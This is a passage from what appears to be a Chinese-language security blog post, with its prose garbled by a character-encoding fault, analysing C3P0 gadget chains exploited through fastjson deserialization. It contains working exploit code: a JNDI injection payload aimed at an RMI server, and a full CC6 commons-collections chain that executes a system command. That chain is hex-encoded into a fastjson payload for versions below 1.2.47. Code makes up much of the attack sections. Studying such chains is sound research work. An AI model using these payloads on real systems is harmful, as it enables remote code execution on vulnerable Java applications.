alt="image-20240411191849519"><br>ÂèØ‰ª•ÁúãÂà∞ËøôÈáåËøîÂõû‰∏Ä‰∏™NameÊàñËÄÖStringÁöÑ<code>jndiName</code>Ôºå‰ΩÜÊòØËøôÈáåÂè™ÊòØËé∑ÂèñÔºåËøòÈúÄË¶ÅÊâæÊÄé‰πàËµãÂÄºÁöÑÔºåÊâæ‰∫ÜÂçäÂ§©Âà∞ËøôÈáåÊ≤°ÊÄùË∑Ø‰∫ÜÔºåÁúãÂÖ∂ÂÆÉÁöÑÂ∏àÂÇÖÂà∞ËøôÈáåÊòØÂÖàÊ≤°Êâæ‰∫ÜÔºåËÄåÊòØ‰ªé<code>dereference()</code>Â§ÑÂæÄ‰∏äÊâæÔºåÊâæÂà∞ÁöÑÊòØ<code>inner()</code>ÔºåÂÖ∂ÂÆûËøô‰∏™ÈÉΩÊ≤°ÂøÖË¶ÅÊâæÔºåÂõ†‰∏∫Ê≥®ÈáäÂ∑≤ÁªèËØ¥‰∫ÜÔºåÂè™ËÉΩÁî®<code>inner()</code>Ë∞ÉÁî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918282.png" alt="image-20240411191859125"><br>ÁªßÁª≠ÂæÄ‰∏äÊâæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919295.png" alt="image-20240411191923067"><br>ËøôÈáåÊâæÁöÑÊòØintÂûãÁöÑ<code>setLoginTimeout()</code>ÂáΩÊï∞ÔºåËøôÈáåÂÜçÊêúÁ¥¢ÂÖ∂ÂÆûÂèØ‰ª•ÁúãÂà∞‰∏ãÈù¢ÁöÑÁªìÊûú<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919607.png" alt="image-20240411191935534"><br>ÂßîÊâòËá≥Âè¶‰∏Ä‰∏™ÂÆû‰æãÊñπÊ≥ïÔºåËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØ<code>JndiRefConnectionPoolDataSource</code>Á±ª‰∏ãÁöÑ<code>setLoginTimeout()</code>ÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span>  </span><br><span class="line"><span class="keyword">throws</span> SQLException  </span><br><span class="line">   &#123; wcpds.setLoginTimeout( seconds ); &#125;</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™<code>wcpds</code>ÊòØ<code>WrapperConnectionPoolDataSource</code>Á±ª‰∏ãÁöÑÂÆû‰æãÔºåÊâÄ‰ª•‰ºöË∞ÉÁî®Ëøô‰∏™Á±ª‰∏ãÁöÑ<code>setLoginTimeout()</code>ÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span>  </span><br><span class="line"><span class="keyword">throws</span> SQLException  </span><br><span class="line">   &#123; getNestedDataSource().setLoginTimeout( seconds ); &#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁªßÁª≠Áúã‰∏ã<code>getNestedDataSource()</code>ÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> DataSource <span class="title function_">getNestedDataSource</span><span class="params">()</span>  </span><br><span class="line">&#123; <span class="keyword">return</span> nestedDataSource; &#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáå<code>nestedDataSource</code>ÂÖ∂ÂÆûÁªßÁª≠Ë∑üÊòØ<code>DataSource</code>ÁöÑÂØπË±°Ôºå‰ΩÜÊòØÁúãÊñáÁ´†ËøôÈáåË∞ÉËØïÁöÑËØùÊòØ<code>JndiRefForwardingDataSource</code>ÁöÑÂØπË±°ÔºåËøôÈáåÊàëÂ∞ùËØï‰∫ÜÁÆÄÂçïÁöÑË∞ÉÁî®Ë∞ÉËØïÔºåÂèëÁé∞ÂÆÉ‰∏∫null</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>);  </span><br><span class="line">    <span class="type">Method</span> <span class="variable">setLoginTimeout</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;setLoginTimeout&quot;</span>, <span class="type">int</span>.class);  </span><br><span class="line">    setLoginTimeout.invoke(aClass.newInstance(), <span class="number">10</span>);  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919999.png" alt="image-20240411191948939"><br>‰∏çÁü•ÈÅìÈÇ£‰∫õÂ∏àÂÇÖÊòØÊÄé‰πàË∞ÉËØïÁöÑÔºåÁõ¥Êé•ÊãøÁùÄexpË∞ÉÁöÑËØùÊÑüËßâÂ∞±ÊØîËæÉÈöæÁêÜËß£Ëøô‰∏ÄÊ≠•Ôºå‰ΩÜÊòØËøôÈáåÊàë‰πüÊÉ≥‰∏çÂá∫Âï•ÂäûÊ≥ï‰∫ÜÔºåÊâÄ‰ª•ÂÖàÂ∞±ËøôÊ†∑Âêß<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919888.png" alt="image-20240411191958748"><br>ÊãøÁùÄexpË∞ÉËØïÂèëÁé∞Á°ÆÂÆûÊòØ<code>JndiRefForwardingDataSource</code>Á±ªÔºåÁÑ∂ÂêéjndiName‰πüÊòØÈÄöËøáfastjsonË∞ÉÁî®setterËÆæÁΩÆÁöÑÔºåÊòØÂú®<code>JndiRefDataSourceBase#setJndiName</code>‰∏ãÂÆåÊàê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111920080.png" alt="image-20240411192006733"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3p0Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:8085/EyHEEMWG\&quot;, &quot;</span> +  </span><br><span class="line">            <span class="string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(payload);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111920319.png" alt="image-20240411192023241"><br>ËøôÈáåÂà©Áî®yakitÁîüÊàêÁöÑ‰∏Ä‰∏™ÊÅ∂ÊÑèÊúçÂä°Âô®ÔºåÂà©Áî®ÊàêÂäüÔºåldapÂíårmiÈÉΩÂèØÁî®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111920119.png" alt="image-20240411192033071"></p><h3 id="Âà©Áî®Èìæ-1"><a href="#Âà©Áî®Èìæ-1" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#‰øÆÊîπjndiName</span><br><span class="line">JndiRefConnectionPoolDataSource#setJndiName -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setJndiName</span><br><span class="line"> </span><br><span class="line">#JNDIË∞ÉÁî®</span><br><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure><h2 id="HEXÂ∫èÂàóÂåñÂ≠óËäÇÂä†ËΩΩÂô®"><a href="#HEXÂ∫èÂàóÂåñÂ≠óËäÇÂä†ËΩΩÂô®" class="headerlink" title="HEXÂ∫èÂàóÂåñÂ≠óËäÇÂä†ËΩΩÂô®"></a>HEXÂ∫èÂàóÂåñÂ≠óËäÇÂä†ËΩΩÂô®</h2><p>ËøôÈáåÈìæÂèØ‰ª•Áî®‰∫é‰∏çÂá∫ÁΩëÁéØÂ¢ÉÔºå‰πüÊòØ‰∏ÄÊù°‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÈìæ</p><h3 id="ÂàÜÊûê-2"><a href="#ÂàÜÊûê-2" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ËøôÊù°ÈìæÂÖ•Âè£Âú®<code>WrapperConnectionPoolDataSource</code>Á±ª‰∏ãÁöÑÊé•Êî∂‰∏Ä‰∏™Â∏ÉÂ∞îÂÄºÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏ä<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921953.png" alt="image-20240411192106711"><br>Ë∑üËøõ<code>parseUserOverridesAsString</code>ÊñπÊ≥ï</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException  </span><br><span class="line">   &#123; <span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">   <span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);  </span><br><span class="line">   <span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );  </span><br><span class="line">   <span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">    <span class="keyword">return</span> Collections.EMPTY_MAP;  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™ÊñπÊ≥ïÈ¶ñÂÖàÂà§Êñ≠<code>userOverridesAsString</code>ÊòØÂê¶‰∏∫Á©∫ÔºåËøôÈáåËÇØÂÆöÊòØËÉΩÊª°Ë∂≥ÁöÑÔºåÂõ†‰∏∫ÊòØÈÄöËøágetterÊñπÊ≥ïËé∑ÂèñÁöÑÔºåÂà©Áî®fastjsonÂæàÂÆπÊòìË∞ÉÁî®ÔºåÁÑ∂ÂêéÂ∞±ÊòØÂ∞Ü<code>userOverridesAsString</code>ÁöÑ<code>HASM_HEADER</code>ÂéªÊéâËøò‰ºöÂéªÊéâÊúÄÂêé‰∏Ä‰∏™Â≠óÁ¨¶Ôºå<code>HASM_HEADER</code>ÊòØ‰∏Ä‰∏™ÈªòËÆ§ÂÄº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921820.png" alt="image-20240411192121764"><br>ÊâÄ‰ª•Â∫èÂàóÂåñÁöÑÊó∂ÂÄôÂä†‰∏äÂ∞±Ë°åÔºåÂéªÊéâÊúÄÂêé‰∏Ä‰∏™Â≠óÁ¨¶ÁªôÂÆÉÈöè‰æøË°•‰∏™‰∏úË•øÂç≥ÂèØÔºåÊàë‰ª¨ÈÄâÊã©ÁöÑÊòØË°•‰∏™ÂàÜÂè∑ÔºåÁÑ∂ÂêéÊòØ<code>ByteUtils.fromHexAscii( hexAscii )</code>ÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ïÂ∞ÜÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Â≠óËäÇÊï∞ÁªÑÔºåÊâÄ‰ª•Êàë‰ª¨‰º†ÂÖ•ÁöÑÂ∫îËØ•ÊòØÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶ÔºåÁÑ∂ÂêéÂ∞±ÊòØÊúÄÂêé‰∏ÄÂè•ËøîÂõû‰∫Ü</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br></pre></td></tr></table></figure><p>ËøôÊÆµ‰ª£Á†ÅÁöÑ‰ΩúÁî®Â∞±ÊòØÂ∞ÜÂ≠óËäÇÊï∞ÁªÑserBytesÂèçÂ∫èÂàóÂåñ‰∏∫‰∏Ä‰∏™MapÂØπË±°ÔºåÁÑ∂ÂêéÔºå‰ΩøÁî®Collections.unmodifiableMap()Â∞ÜËøô‰∏™MapÂØπË±°ËΩ¨Êç¢‰∏∫‰∏Ä‰∏™‰∏çÂèØ‰øÆÊîπÁöÑMapÂØπË±°ÔºåË∑üËøõ<code>fromByteArray</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921524.png" alt="image-20240411192137372"><br>ÁªßÁª≠Ë∑üËøõ<code>deserializeFromByteArray</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111921805.png" alt="image-20240411192149674"><br>ÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫ÜreadObjectÊñπÊ≥ïÔºåÊâÄ‰ª•Ëøô‰∏™‰πüÊòØ‰∏ÄÊù°‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÈìæ</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><p>ËøôÊù°ÈìæÂÖ∂ÂÆûË∑ü‰∏ãÊù•ÂèëÁé∞Â∞±ÂæàÁÆÄÂçïÔºå‰ΩÜÊòØÂÖ∂ÂÆûÊûÑÈÄ†expÁöÑÊó∂ÂÄôÊúâÁÇπËø∑ÔºåÂà©Áî®fastjsonÂèçÂ∫èÂàóÂåñÁöÑÁâπÊÄßÂÖ∂ÂÆû‰ºöÂÖàË∞ÉÁî®ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂÖ∂Ê¨°Êâç‰ºöË∞ÉgetterÂç≥<code>getUserOverridesAsString()</code>ÊñπÊ≥ïÔºåÈÇ£‰πàÂÖ∂ÂÆûÁ¨¨‰∏ÄÊ¨°Â∞±‰∏ç‰ºöËß¶ÂèëÂà∞Êàë‰ª¨ÁöÑÂç±Èô©Â∫èÂàóÂåñÊï∞ÊçÆÔºåÊâÄ‰ª•ËøôÈáåÂÖ∂ÂÆûÊòØÈúÄË¶ÅËß¶Âèë‰∏§Ê¨°ÊûÑÈÄ†ÂáΩÊï∞ÔºåÁºñÂÜôexpÂÖ∂ÂÆûÂ∞±ÊòØÂ∞ÜCCÈìæÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆËøõË°å16ËøõÂà∂ÁºñÁ†ÅÂêéÂä†Âà∞<code>userOverridesAsString</code>‰∏≠Âç≥ÂèØÔºåËøôÈáåÂÖàÊãøÊû´Â∏àÂÇÖÁöÑexpË∞ÉËØï‰∏Ä‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Hex</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//CC6ÁöÑÂà©Áî®Èìæ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//‰ΩøÁî®InvokeTransformerÂåÖË£Ö‰∏Ä‰∏ã</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"> </span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//ÂèçÂ∞Ñ‰øÆÊîπLazyMapÁ±ªÁöÑfactoryÂ±ûÊÄß</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//Â∞ÜÁ±ªÂ∫èÂàóÂåñ‰∏∫Â≠óËäÇÊï∞ÁªÑ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//Â≠óËäÇÊï∞ÁªÑËΩ¨ÂçÅÂÖ≠ËøõÂà∂</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111922795.png" 